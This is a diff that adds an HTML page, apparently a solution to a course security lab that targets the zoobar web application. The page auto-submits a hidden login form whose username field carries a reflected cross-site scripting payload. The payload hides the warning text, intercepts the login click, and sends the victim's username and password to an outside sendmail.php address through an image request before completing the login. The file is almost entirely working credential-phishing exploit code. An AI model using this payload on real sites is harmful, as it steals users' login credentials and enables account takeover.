@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    <form method="POST" style="display:none" id="form" action="http://10.211.55.6:8080/zoobar/index.cgi/login">
+        <input id="input" type="text" value='' name="login_username">
+    </form>
+    <script type="text/javascript">
+        document.getElementById('input').value = '">'
+            + '<style>.warning{display:none}</style>'
+            + '<script>'
+                + 'document.addEventListener("DOMContentLoaded", function () {'
+                    + 'console.log("done");'
+                    + 'document.getElementsByName("submit_login")[0].addEventListener("click", function(e){'
+                        + 'e.preventDefault();'
+                        + 'var name = document.getElementsByName("login_username")[0].value;'
+                        + 'var password = document.getElementsByName("login_password")[0].value;'
+                        + 'var image = new Image();'
+                        + 'image.onerror = function () {'
+                            + 'console.log("sent");'
+                            + 'document.getElementsByName("loginform")[0].submit();'
+                        + '};'
+                        + 'image.src = "http://tcloud.sjtu.edu.cn/course/css/sendmail.php?to=kalzium@sjtu.edu.cn&payload=" + encodeURIComponent(name + "," + password) + "&random=" + Math.random();'
+                    + '});'
+                +'});'
+            + '<\/script><input name="submit_login" value="Log in" type="hidden';
+        document.getElementById('form').submit();
+    </script>
+</body>
+</html>
